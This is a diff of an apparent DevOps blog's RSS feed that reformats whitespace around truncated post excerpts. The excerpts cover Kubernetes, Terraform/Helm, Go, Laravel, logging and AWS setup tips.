-      <description>step1 the main.tf include following contents: 1resource &amp;#34;helm_release&amp;#34; &amp;#34;fluentd_server&amp;#34; { 2 name = &amp;#34;fluentd-server&amp;#34; 3 repository = &amp;#34;https://charts.bitnami.com/bitnami&amp;#34; 4 # chart = &amp;#34;${path.module}/../../../../../charts/fluentd&amp;#34; 5 version = &amp;#34;3.1.0&amp;#34; 6 namespace = &amp;#34;kube-system&amp;#34; 7 8 values = [ 9 &amp;lt;&amp;lt;-EOF 10 forwarder: 11 configMap: &amp;#34;fluentd-forwarder-config&amp;#34; 12 rbac: 13 pspEnabled: true 14 resources: 15 limits: 16 memory: 1Gi 17 requests: 18 memory: 512Mi 19 aggregator: 20 replicaCount: 1 21 configMap: &amp;#34;fluentd-elasticsearch-config&amp;#34; 22 resources: 23 limits: 24 memory: 1Gi 25 requests: 26 memory: 512Mi 27 extraEnv: 28 - name: ELASTICSEARCH_HOST 29 value: &amp;#34;${var.</description>
+      <description>
+        
+          
+            step1 the main.tf include following contents: 1resource &amp;#34;helm_release&amp;#34; &amp;#34;fluentd_server&amp;#34; { 2 name = &amp;#34;fluentd-server&amp;#34; 3 repository = &amp;#34;https://charts.bitnami.com/bitnami&amp;#34; 4 # chart = &amp;#34;${path.module}/../../../../../charts/fluentd&amp;#34; 5 version = &amp;#34;3.1.0&amp;#34; 6 namespace = &amp;#34;kube-system&amp;#34; 7 8 values = [ 9 &amp;lt;&amp;lt;-EOF 10 forwarder: 11 configMap: &amp;#34;fluentd-forwarder-config&amp;#34; 12 rbac: 13 pspEnabled: true 14 resources: 15 limits: 16 memory: 1Gi 17 requests: 18 memory: 512Mi 19 aggregator: 20 replicaCount: 1 21 configMap: &amp;#34;fluentd-elasticsearch-config&amp;#34; 22 resources: 23 limits: 24 memory: 1Gi 25 requests: 26 memory: 512Mi 27 extraEnv: 28 - name: ELASTICSEARCH_HOST 29 value: &amp;#34;${var.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -210,7 +343,14 @@ The main.tf include kubernetes &amp;lsquo;deployment&amp;rsquo; object 1resource
       <pubDate>Sun, 15 Nov 2020 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/getting-stared-nucalio/</guid>
-      <description>use Helm charts: Github 1	helm repo add nuclio https://nuclio.github.io/nuclio/charts 2	kubectl create namespace nuclio copy registry to nuclio namespace from existing namespace 1kubectl get secret repo-registry -n dev-ns -o yaml \ 2| sed s/&amp;#34;namespace: dev-ns&amp;#34;/&amp;#34;namespace: nuclio&amp;#34;/ \ 3| kubectl apply -f - install nuclio 1	helm install nuclio \ 2 --set registry.secretName=repo-registry \ 3 --set registry.pushPullUrl=localhost/nucalio \ 4 nuclio/nuclio -n nuclio visit dashboard 1	kubectl -n nuclio port-forward $(kubectl get pods -n nuclio -l nuclio.</description>
+      <description>
+        
+          
+            use Helm charts: Github 1	helm repo add nuclio https://nuclio.github.io/nuclio/charts 2	kubectl create namespace nuclio copy registry to nuclio namespace from existing namespace 1kubectl get secret repo-registry -n dev-ns -o yaml \ 2| sed s/&amp;#34;namespace: dev-ns&amp;#34;/&amp;#34;namespace: nuclio&amp;#34;/ \ 3| kubectl apply -f - install nuclio 1	helm install nuclio \ 2 --set registry.secretName=repo-registry \ 3 --set registry.pushPullUrl=localhost/nucalio \ 4 nuclio/nuclio -n nuclio visit dashboard 1	kubectl -n nuclio port-forward $(kubectl get pods -n nuclio -l nuclio.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -219,8 +359,15 @@ The main.tf include kubernetes &amp;lsquo;deployment&amp;rsquo; object 1resource
       <pubDate>Mon, 02 Nov 2020 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/schedule-cleanup-k8s-resources/</guid>
-      <description>Prepare Golang program code use clean up unused pods and replicaset resources in kubernetes we can clean up not running status pods and deactive replicasets
-initialization Go lanugage project evnironment 1	mkdir k8s_res_cleanup &amp;amp;&amp;amp; cd k8s_res_cleanup 2	go mod init example.com/cleanup/resources 3	go get -v -u k8s.io/client-go@v0.18.2 # install packages 4	go get -v -u github.com/prometheus/common@v0.1.0 create sub packageconfig/k8s.go indicate how can connect to kubernetes cluster 1package config 2 3import ( 4	&amp;#34;flag&amp;#34; 5	logs &amp;#34;github.</description>
+      <description>
+        
+          
+            Prepare Golang program code use clean up unused pods and replicaset resources in kubernetes we can clean up not running status pods and deactive replicasets
+initialization Go lanugage project evnironment 1	mkdir k8s_res_cleanup &amp;amp;&amp;amp; cd k8s_res_cleanup 2	go mod init example.com/cleanup/resources 3	go get -v -u k8s.io/client-go@v0.18.2 # install packages 4	go get -v -u github.com/prometheus/common@v0.1.0 create sub packageconfig/k8s.go indicate how can connect to kubernetes cluster 1package config 2 3import ( 4	&amp;#34;flag&amp;#34; 5	logs &amp;#34;github.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -229,8 +376,15 @@ initialization Go lanugage project evnironment 1	mkdir k8s_res_cleanup &amp;amp;
       <pubDate>Sun, 25 Oct 2020 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/k8s-metrics-server/</guid>
-      <description>When we repeatedly install the Metrics-Server, because we use helm to install it, deleting one of them will cause the following error when executing the command related to kubectl top nodes: Error from server (NotFound): the server could not find the requested resource (get services http:heapster:)
-A large part of this is due to the removal of the Apiservice Resources from Metics, when you execute the following command to ensure that the Apiservice exists kubectl get apiservice | grep metrics v1beta1.</description>
+      <description>
+        
+          
+            When we repeatedly install the Metrics-Server, because we use helm to install it, deleting one of them will cause the following error when executing the command related to kubectl top nodes: Error from server (NotFound): the server could not find the requested resource (get services http:heapster:)
+A large part of this is due to the removal of the Apiservice Resources from Metics, when you execute the following command to ensure that the Apiservice exists kubectl get apiservice | grep metrics v1beta1.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -239,7 +393,14 @@ A large part of this is due to the removal of the Apiservice Resources from Meti
       <pubDate>Thu, 15 Oct 2020 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/kubernetes-ingress-guides/</guid>
-      <description>Using Nginx-Ingress Controller in AWS Eks environment Need manually enable the Proxy protocol V2 in NLB target group just only TCP https 443 listener Rather than TCP http 80 listener Multiple SSL certificate need manually add to NLB The http redirect to https, need to change some paramets 1	# use http-snippet and open proxy protocol 2 use-proxy-protocol: &amp;#39;true&amp;#39; 3 use-forwarded-headers: &amp;#39;true&amp;#39; 4 server-tokens: &amp;#39;false&amp;#39; 5 http-snippet: | 6 server { 7 listen 8000; 8 return 308 https://$host$request_uri; 9 } 10 proxy-real-ip-cidr: ${join(&amp;#34;,&amp;#34;, var.</description>
+      <description>
+        
+          
+            Using Nginx-Ingress Controller in AWS Eks environment Need manually enable the Proxy protocol V2 in NLB target group just only TCP https 443 listener Rather than TCP http 80 listener Multiple SSL certificate need manually add to NLB The http redirect to https, need to change some paramets 1	# use http-snippet and open proxy protocol 2 use-proxy-protocol: &amp;#39;true&amp;#39; 3 use-forwarded-headers: &amp;#39;true&amp;#39; 4 server-tokens: &amp;#39;false&amp;#39; 5 http-snippet: | 6 server { 7 listen 8000; 8 return 308 https://$host$request_uri; 9 } 10 proxy-real-ip-cidr: ${join(&amp;#34;,&amp;#34;, var.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -248,8 +409,15 @@ A large part of this is due to the removal of the Apiservice Resources from Meti
       <pubDate>Sun, 11 Oct 2020 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/airflow-kuberntes-logs-config/</guid>
-      <description>Problem description When use kubernetes executor in airflow, the dags not use the podOperator but that use PythonOperator, the console logs end of Running %s on host %s &amp;lt;TaskInstance:, then the task logs don&amp;rsquo;t redirect to stdout According to the Airflow descript need config the logging class: custom_log_settings Change the custom log settings comment relative code and enable to console the tee_file_task_handler.py edit the following code snippet.
-comment the following content.</description>
+      <description>
+        
+          
+            Problem description When use kubernetes executor in airflow, the dags not use the podOperator but that use PythonOperator, the console logs end of Running %s on host %s &amp;lt;TaskInstance:, then the task logs don&amp;rsquo;t redirect to stdout According to the Airflow descript need config the logging class: custom_log_settings Change the custom log settings comment relative code and enable to console the tee_file_task_handler.py edit the following code snippet.
+comment the following content.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -258,7 +426,14 @@ comment the following content.</description>
       <pubDate>Sat, 10 Oct 2020 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/terraform-helm-issues/</guid>
-      <description>The Metrics-Server helm chart as Terraform HCL 1resource &amp;#34;helm_release&amp;#34; &amp;#34;metrics-server&amp;#34; { 2 name = &amp;#34;metrics-server&amp;#34; 3 repository = &amp;#34;https://charts.bitnami.com/bitnami&amp;#34; 4 chart = &amp;#34;metrics-server&amp;#34; 5 version = &amp;#34;4.1.4&amp;#34; 6 namespace = &amp;#34;kube-system&amp;#34; 7 8 set { 9 name = &amp;#34;extraArgs.kubelet-preferred-address-types&amp;#34; 10 value = &amp;#34;InternalIP\\,ExternalIP\\,Hostname&amp;#34; 11 } 12 13 set { 14 name = &amp;#34;resources.requests.memory&amp;#34; 15 value = &amp;#34;500Mi&amp;#34; 16 } 17 18 set { 19 name = &amp;#34;resources.limits.memory&amp;#34; 20 value = &amp;#34;1Gi&amp;#34; 21 } 22 23 set { 24 name = &amp;#34;apiService.</description>
+      <description>
+        
+          
+            The Metrics-Server helm chart as Terraform HCL 1resource &amp;#34;helm_release&amp;#34; &amp;#34;metrics-server&amp;#34; { 2 name = &amp;#34;metrics-server&amp;#34; 3 repository = &amp;#34;https://charts.bitnami.com/bitnami&amp;#34; 4 chart = &amp;#34;metrics-server&amp;#34; 5 version = &amp;#34;4.1.4&amp;#34; 6 namespace = &amp;#34;kube-system&amp;#34; 7 8 set { 9 name = &amp;#34;extraArgs.kubelet-preferred-address-types&amp;#34; 10 value = &amp;#34;InternalIP\\,ExternalIP\\,Hostname&amp;#34; 11 } 12 13 set { 14 name = &amp;#34;resources.requests.memory&amp;#34; 15 value = &amp;#34;500Mi&amp;#34; 16 } 17 18 set { 19 name = &amp;#34;resources.limits.memory&amp;#34; 20 value = &amp;#34;1Gi&amp;#34; 21 } 22 23 set { 24 name = &amp;#34;apiService.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -267,9 +442,16 @@ comment the following content.</description>
       <pubDate>Thu, 10 Sep 2020 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/k8s-backup-restore-using-velero/</guid>
-      <description>Installing or Upgrade Velero client on Mac OS:
+      <description>
+        
+          
+            Installing or Upgrade Velero client on Mac OS:
 1	brew install velero 2	HOMEBREW_NO_AUTO_UPDATE=1 brew upgrade velero #upgrade to the latest version if maybe The Velero should use object store save the snapshot. so we use Minio as kubernetes object store.Minio launched as part of docker-compose.yaml
-1	minio: 2 container_name: &amp;#34;minio&amp;#34; 3 image: minio/minio 4 command: &amp;#34;server /data&amp;#34; 5 ports: 6 - &amp;#34;9000:9000&amp;#34; 7 environment: 8 MINIO_ACCESS_KEY: “xxxxxxx” 9 MINIO_SECRET_KEY: “xxxxxxx” 10 volumes: 11 - &amp;#34;.</description>
+1	minio: 2 container_name: &amp;#34;minio&amp;#34; 3 image: minio/minio 4 command: &amp;#34;server /data&amp;#34; 5 ports: 6 - &amp;#34;9000:9000&amp;#34; 7 environment: 8 MINIO_ACCESS_KEY: “xxxxxxx” 9 MINIO_SECRET_KEY: “xxxxxxx” 10 volumes: 11 - &amp;#34;.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -278,9 +460,16 @@ comment the following content.</description>
       <pubDate>Thu, 03 Sep 2020 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/custom-domain-name-in-k8s/</guid>
-      <description>We use default service domain name ${servicename}.${namespace}.svc.cluster.localin kubernetes cluster, however the custom private domain name in private k8s networks frequently used. we can use coredns component reparse the private domain name to default CNAME.
+      <description>
+        
+          
+            We use default service domain name ${servicename}.${namespace}.svc.cluster.localin kubernetes cluster, however the custom private domain name in private k8s networks frequently used. we can use coredns component reparse the private domain name to default CNAME.
 change coredns configmap add custom domain name config to yaml kubectl edit cm coredns -n kube-system
-1data: 2 Corefile: | 3 .:53 { 4 errors 5 health { 6 lameduck 5s 7 } 8 ready 9 kubernetes cluster.</description>
+1data: 2 Corefile: | 3 .:53 { 4 errors 5 health { 6 lameduck 5s 7 } 8 ready 9 kubernetes cluster.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -289,8 +478,15 @@ change coredns configmap add custom domain name config to yaml kubectl edit cm c
       <pubDate>Tue, 01 Sep 2020 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/aws-local-development/</guid>
-      <description>When you develop components locally that rely on AWS, it can be cumbersome to configure authentication information, and sometimes network latency. It is important to mock with a native AWS component, which can:localstack I&amp;rsquo;m using Docker-Compose here to start a set of tools that local development depends on：
-The docker-compose.yml looks like this following 1version: &amp;#39;3&amp;#39; 2 3services: 4 mongodb: 5 image: mongo:3.4.1 6 volumes: 7 - &amp;#39;./easymock/data/db:/data/db&amp;#39; 8 networks: 9 - easy-mock 10 ports: 11 - &amp;#34;27017:27017&amp;#34; 12 restart: always 13 container_name: mongodb 14 15 redis: 16 image: redis:4.</description>
+      <description>
+        
+          
+            When you develop components locally that rely on AWS, it can be cumbersome to configure authentication information, and sometimes network latency. It is important to mock with a native AWS component, which can:localstack I&amp;rsquo;m using Docker-Compose here to start a set of tools that local development depends on：
+The docker-compose.yml looks like this following 1version: &amp;#39;3&amp;#39; 2 3services: 4 mongodb: 5 image: mongo:3.4.1 6 volumes: 7 - &amp;#39;./easymock/data/db:/data/db&amp;#39; 8 networks: 9 - easy-mock 10 ports: 11 - &amp;#34;27017:27017&amp;#34; 12 restart: always 13 container_name: mongodb 14 15 redis: 16 image: redis:4.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -299,7 +495,10 @@ The docker-compose.yml looks like this following 1version: &amp;#39;3&amp;#39; 2
       <pubDate>Tue, 25 Aug 2020 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/k8s-common-command-conclusion/</guid>
-      <description>When we use the Kubernetes platform,has many commands is important:
+      <description>
+        
+          
+            When we use the Kubernetes platform,has many commands is important:
 The k command is alias to kubectl
 label for nodes kubectl label nodes host02 disktype=ssd
 view local config for kubernetes context k config get-contexts
@@ -308,7 +507,11 @@ force delete pod, sometimes the pod still terminating.
 k delete pods &amp;lt;pod&amp;gt; -n &amp;lt;namespace&amp;gt; --grace-period=0 --force
 get all resource in current kubernetes cluster
 k get all --all-namespaces
-view job logs</description>
+view job logs
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -317,7 +520,14 @@ view job logs</description>
       <pubDate>Tue, 25 Aug 2020 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/laravel-librarys/</guid>
-      <description>use cache library out of laravel framework 1&amp;lt;?php 2 3namespace Company; 4 5 6use Illuminate\Cache\CacheManager; 7use Illuminate\Container\Container; 8use Illuminate\Filesystem\Filesystem; 9 10class FileCache { 11 12 13 private $cacheManager; 14 private $cache; 15 16 private function __construct() 17 { 18 $container = new Container(); 19 $container[&amp;#39;config&amp;#39;] = [ 20 &amp;#39;cache.default&amp;#39; =&amp;gt; &amp;#39;file&amp;#39;, 21 &amp;#39;cache.stores.file&amp;#39; =&amp;gt; [ 22 &amp;#39;driver&amp;#39; =&amp;gt; &amp;#39;file&amp;#39;, 23 &amp;#39;path&amp;#39; =&amp;gt; __DIR__ . &amp;#39;/../../../storage/framework/cache&amp;#39; 24 ] 25 ]; 26 27 $container[&amp;#39;files&amp;#39;] = new Filesystem(); 28 $this-&amp;gt;cacheManager = new CacheManager($container); 29 $this-&amp;gt;cache = $this-&amp;gt;cacheManager-&amp;gt;store(); 30 } 31 32 public static function rememberForever($key, callable $callBack) { 33 return (new static()) 34 -&amp;gt;cache 35 -&amp;gt;rememberForever($key, $callBack); 36 } 37} use file cache get AWS SecretsManager item 1&amp;lt;?</description>
+      <description>
+        
+          
+            use cache library out of laravel framework 1&amp;lt;?php 2 3namespace Company; 4 5 6use Illuminate\Cache\CacheManager; 7use Illuminate\Container\Container; 8use Illuminate\Filesystem\Filesystem; 9 10class FileCache { 11 12 13 private $cacheManager; 14 private $cache; 15 16 private function __construct() 17 { 18 $container = new Container(); 19 $container[&amp;#39;config&amp;#39;] = [ 20 &amp;#39;cache.default&amp;#39; =&amp;gt; &amp;#39;file&amp;#39;, 21 &amp;#39;cache.stores.file&amp;#39; =&amp;gt; [ 22 &amp;#39;driver&amp;#39; =&amp;gt; &amp;#39;file&amp;#39;, 23 &amp;#39;path&amp;#39; =&amp;gt; __DIR__ . &amp;#39;/../../../storage/framework/cache&amp;#39; 24 ] 25 ]; 26 27 $container[&amp;#39;files&amp;#39;] = new Filesystem(); 28 $this-&amp;gt;cacheManager = new CacheManager($container); 29 $this-&amp;gt;cache = $this-&amp;gt;cacheManager-&amp;gt;store(); 30 } 31 32 public static function rememberForever($key, callable $callBack) { 33 return (new static()) 34 -&amp;gt;cache 35 -&amp;gt;rememberForever($key, $callBack); 36 } 37} use file cache get AWS SecretsManager item 1&amp;lt;?
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -326,8 +536,15 @@ view job logs</description>
       <pubDate>Sat, 22 Aug 2020 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/generate-crds-api-k8s/</guid>
-      <description>Why does this article exist because when we use Kubesphere. the go client code need to use the client objects of K8s but dosen&amp;rsquo;t provider the s2ibinary object client code. https://github.com/kubesphere/s2ioperator/tree/master/pkg/client/clientset/versioned/typed/devops/v1alpha1
-Prepare directory structure and resource defination files The doc.go include content: 1// +k8s:deepcopy-gen=package,register 2// +k8s:defaulter-gen=TypeMeta 3// +groupName=devops.kubesphere.io 4package v1alpha1 The register.go main defination custom resources GroupName and GroupVersion 1package v1alpha1 2 3import ( 4 &amp;#34;k8s.io/apimachinery/pkg/runtime/schema&amp;#34; 5 &amp;#34;sigs.k8s.io/controller-runtime/pkg/scheme&amp;#34; 6) 7 8type CodeFramework string 9 10const ( 11 Ruby CodeFramework = &amp;#34;ruby&amp;#34; 12 Go CodeFramework = &amp;#34;go&amp;#34; 13 Java CodeFramework = &amp;#34;Java&amp;#34; 14 JavaTomcat CodeFramework = &amp;#34;JavaTomcat&amp;#34; 15 Nodejs CodeFramework = &amp;#34;Nodejs&amp;#34; 16 Python CodeFramework = &amp;#34;python&amp;#34; 17 GroupName string = &amp;#34;devops.</description>
+      <description>
+        
+          
+            Why does this article exist because when we use Kubesphere. the go client code need to use the client objects of K8s but dosen&amp;rsquo;t provider the s2ibinary object client code. https://github.com/kubesphere/s2ioperator/tree/master/pkg/client/clientset/versioned/typed/devops/v1alpha1
+Prepare directory structure and resource defination files The doc.go include content: 1// +k8s:deepcopy-gen=package,register 2// +k8s:defaulter-gen=TypeMeta 3// +groupName=devops.kubesphere.io 4package v1alpha1 The register.go main defination custom resources GroupName and GroupVersion 1package v1alpha1 2 3import ( 4 &amp;#34;k8s.io/apimachinery/pkg/runtime/schema&amp;#34; 5 &amp;#34;sigs.k8s.io/controller-runtime/pkg/scheme&amp;#34; 6) 7 8type CodeFramework string 9 10const ( 11 Ruby CodeFramework = &amp;#34;ruby&amp;#34; 12 Go CodeFramework = &amp;#34;go&amp;#34; 13 Java CodeFramework = &amp;#34;Java&amp;#34; 14 JavaTomcat CodeFramework = &amp;#34;JavaTomcat&amp;#34; 15 Nodejs CodeFramework = &amp;#34;Nodejs&amp;#34; 16 Python CodeFramework = &amp;#34;python&amp;#34; 17 GroupName string = &amp;#34;devops.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -336,8 +553,15 @@ Prepare directory structure and resource defination files The doc.go include con
       <pubDate>Thu, 20 Aug 2020 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/setup-cloudfoundry-in-k8s/</guid>
-      <description>First prepare the tools installation in host: Kind: https://kind.sigs.k8s.io/docs/user/quick-start/ Cf command: https://docs.cloudfoundry.org/cf-cli/install-go-cli.html HOMEBREW_NO_AUTO_UPDATE=1 brew install cloudfoundry/tap/cf-cli@6 or HOMEBREW_NO_AUTO_UPDATE=1 brew install cloudfoundry/tap/cf-cli@7 Kubectl command: https://kubernetes.io/docs/tasks/tools/install-kubectl/ Helm: https://helm.sh/docs/intro/install/ The Kind must definiation config.yml, refer to expose http(80) and https(443) ports to host machine, because the k8s cluster node ip is internal-ip created by Kind such as: 172.18.0.2
-1kind: Cluster 2apiVersion: kind.x-k8s.io/v1alpha4 3networking: 4 # WARNING: It is _strongly_ recommended that you keep this the default 5 # (127.</description>
+      <description>
+        
+          
+            First prepare the tools installation in host: Kind: https://kind.sigs.k8s.io/docs/user/quick-start/ Cf command: https://docs.cloudfoundry.org/cf-cli/install-go-cli.html HOMEBREW_NO_AUTO_UPDATE=1 brew install cloudfoundry/tap/cf-cli@6 or HOMEBREW_NO_AUTO_UPDATE=1 brew install cloudfoundry/tap/cf-cli@7 Kubectl command: https://kubernetes.io/docs/tasks/tools/install-kubectl/ Helm: https://helm.sh/docs/intro/install/ The Kind must definiation config.yml, refer to expose http(80) and https(443) ports to host machine, because the k8s cluster node ip is internal-ip created by Kind such as: 172.18.0.2
+1kind: Cluster 2apiVersion: kind.x-k8s.io/v1alpha4 3networking: 4 # WARNING: It is _strongly_ recommended that you keep this the default 5 # (127.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -346,7 +570,14 @@ Prepare directory structure and resource defination files The doc.go include con
       <pubDate>Sat, 15 Aug 2020 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/laravel-php-snippets/</guid>
-      <description>Temporary ip allow list in PHP framework Laravel 1&amp;lt;?php 2 3namespace App\Http\Middleware; 4 5use Closure; 6use Illuminate\Http\Request; 7use Illuminate\Support\Facades\Cache; 8use Illuminate\Support\Facades\Log; 9use Symfony\Component\HttpFoundation\IpUtils; 10 11class IpAllowMiddleware 12{ 13 /** 14 * Handle an incoming request. 15 * 16 * @param \Illuminate\Http\Request $request 17 * @param \Closure $next 18 * @return mixed 19 */ 20 public function handle($request, Closure $next) 21 { 22 $this-&amp;gt;setTrustProxy(); 23 $clientIp = $request-&amp;gt;getClientIp(); 24 if (!$this-&amp;gt;compareOrigin($clientIp)) { 25 Log::warning(&amp;#34;The client ip is forbidden: &amp;#34; .</description>
+      <description>
+        
+          
+            Temporary ip allow list in PHP framework Laravel 1&amp;lt;?php 2 3namespace App\Http\Middleware; 4 5use Closure; 6use Illuminate\Http\Request; 7use Illuminate\Support\Facades\Cache; 8use Illuminate\Support\Facades\Log; 9use Symfony\Component\HttpFoundation\IpUtils; 10 11class IpAllowMiddleware 12{ 13 /** 14 * Handle an incoming request. 15 * 16 * @param \Illuminate\Http\Request $request 17 * @param \Closure $next 18 * @return mixed 19 */ 20 public function handle($request, Closure $next) 21 { 22 $this-&amp;gt;setTrustProxy(); 23 $clientIp = $request-&amp;gt;getClientIp(); 24 if (!$this-&amp;gt;compareOrigin($clientIp)) { 25 Log::warning(&amp;#34;The client ip is forbidden: &amp;#34; .
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -355,7 +586,14 @@ Prepare directory structure and resource defination files The doc.go include con
       <pubDate>Wed, 11 Sep 2019 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/go-usually-commands/</guid>
-      <description>Global install go program(go version &amp;gt;=1.16.0) go install sigs.k8s.io/kind@v0.9.0 when go version is higher 1.12 should install godoc command go get golang.org/x/tools/cmd/godoc launch go docs services in local godoc -http=:6060 view go environment variables,inlude GO ROOT path go env fmt package Println docs go doc fmt Println initialization go modules, when reference sub directory straightway example.com/module/sub1/sub2 go mod init example.com/module delete packages go clean -i -v -x github.com/somepkg/go/simpleGitHub Add modules to current packages go mod edit -require github.</description>
+      <description>
+        
+          
+            Global install go program(go version &amp;gt;=1.16.0) go install sigs.k8s.io/kind@v0.9.0 when go version is higher 1.12 should install godoc command go get golang.org/x/tools/cmd/godoc launch go docs services in local godoc -http=:6060 view go environment variables,inlude GO ROOT path go env fmt package Println docs go doc fmt Println initialization go modules, when reference sub directory straightway example.com/module/sub1/sub2 go mod init example.com/module delete packages go clean -i -v -x github.com/somepkg/go/simpleGitHub Add modules to current packages go mod edit -require github.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -364,9 +602,16 @@ Prepare directory structure and resource defination files The doc.go include con
       <pubDate>Tue, 02 Jul 2019 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/elastalert-usage/</guid>
-      <description>Dynamically generate alarm rules and send email to relative people.based on a given parameter or configuration Elastalert
+      <description>
+        
+          
+            Dynamically generate alarm rules and send email to relative people.based on a given parameter or configuration Elastalert
 The directory construct look following 1├── elastalert 2├── generate_rule.py 3├── param.json 4├── rules 5└── template You can also through pip install elastalert installing elastalert package. I&amp;rsquo;m going to use it directly here The templatedirectory store tpl file, use this template generate some rules file to rules directory. and used elastalert
-Configuration file param.json 1{ 2 &amp;#34;dev&amp;#34;: { 3 &amp;#34;public_config&amp;#34;: { 4 &amp;#34;run_every&amp;#34;: 5, 5 &amp;#34;buffer_time&amp;#34;: 15, 6 &amp;#34;es_host&amp;#34;: &amp;#34;dev.</description>
+Configuration file param.json 1{ 2 &amp;#34;dev&amp;#34;: { 3 &amp;#34;public_config&amp;#34;: { 4 &amp;#34;run_every&amp;#34;: 5, 5 &amp;#34;buffer_time&amp;#34;: 15, 6 &amp;#34;es_host&amp;#34;: &amp;#34;dev.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -375,7 +620,14 @@ Configuration file param.json 1{ 2 &amp;#34;dev&amp;#34;: { 3 &amp;#34;public_co
       <pubDate>Sun, 05 May 2019 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/aws-network-secrutiy-enhance/</guid>
-      <description>Vpc network division According to the requirements of the product and the customer, the two services of the two types of subnets are isolated. For example, DBsubnet01 and DBsubnet02 are both internal private subnets and belong to different product segments. ​	The two major subnet types are the intranet and the extranet. The internal network goes to the NAT Gateway, and the external network goes to the Internet Gateway. Like: RDS, Redis, background services, etc.</description>
+      <description>
+        
+          
+            Vpc network division According to the requirements of the product and the customer, the two services of the two types of subnets are isolated. For example, DBsubnet01 and DBsubnet02 are both internal private subnets and belong to different product segments. ​	The two major subnet types are the intranet and the extranet. The internal network goes to the NAT Gateway, and the external network goes to the Internet Gateway. Like: RDS, Redis, background services, etc.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -384,7 +636,14 @@ Configuration file param.json 1{ 2 &amp;#34;dev&amp;#34;: { 3 &amp;#34;public_co
       <pubDate>Fri, 10 Aug 2018 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/logstash_configure/</guid>
-      <description>The logs collect workflow Filebeat gather the file path log files then send to Logstash 5044 port The logstash receive and transform extract fields and send to Elasticsearch The Filebeat config file is: /etc/filebeat.yml installing the Filebeat script: 1#!/bin/bash 2FILEBEAT_NAME=filebeat-6.7.2-x86_64.rpm 3# install filebeat 4curl -L -O https://artifacts.elastic.co/downloads/beats/filebeat/${FILEBEAT_NAME} 5sudo rpm -vi ${FILEBEAT_NAME} &amp;amp;&amp;amp; sudo rm ${FILEBEAT_NAME} 6sudo chkconfig --add filebeat 7sudo chkconfig filebeat on 8sudo mv -f filebeat.yml /etc/filebeat/filebeat.yml 9sudo chown root:root /etc/filebeat/filebeat.</description>
+      <description>
+        
+          
+            The logs collect workflow Filebeat gather the file path log files then send to Logstash 5044 port The logstash receive and transform extract fields and send to Elasticsearch The Filebeat config file is: /etc/filebeat.yml installing the Filebeat script: 1#!/bin/bash 2FILEBEAT_NAME=filebeat-6.7.2-x86_64.rpm 3# install filebeat 4curl -L -O https://artifacts.elastic.co/downloads/beats/filebeat/${FILEBEAT_NAME} 5sudo rpm -vi ${FILEBEAT_NAME} &amp;amp;&amp;amp; sudo rm ${FILEBEAT_NAME} 6sudo chkconfig --add filebeat 7sudo chkconfig filebeat on 8sudo mv -f filebeat.yml /etc/filebeat/filebeat.yml 9sudo chown root:root /etc/filebeat/filebeat.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -393,7 +652,14 @@ Configuration file param.json 1{ 2 &amp;#34;dev&amp;#34;: { 3 &amp;#34;public_co
       <pubDate>Fri, 02 Mar 2018 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/ubuntu-install-nfs/</guid>
-      <description>1#updating the system and install nfs daemon 2sudo apt-get update 3sudo apt install nfs-kernel-server 4 5#view the relative info about NFS 6sudo cat /proc/fs/nfsd/versions 7cat /etc/default/nfs-kernel-server 8cat /etc/default/nfs-common 9 10#create and bind the NFS directory in host hard disk 11sudo mkdir -p /srv/nfs4/data1 12sudo mkdir -p /srv/nfs4/data2 13sudo mount --bind /data2/nfs /srv/nfs4/data1 14sudo mount --bind /data3/nfs /srv/nfs4/data2 15 16#let binds permanent effect 17sudo vi /etc/fstab 18/data1/nfs /srv/nfs4/data2 none bind 0 0 19/data2/nfs /srv/nfs4/data3 none bind 0 0 20 21sudo vi /etc/exports 22# add following content to the file 23/srv/nfs4 192.</description>
+      <description>
+        
+          
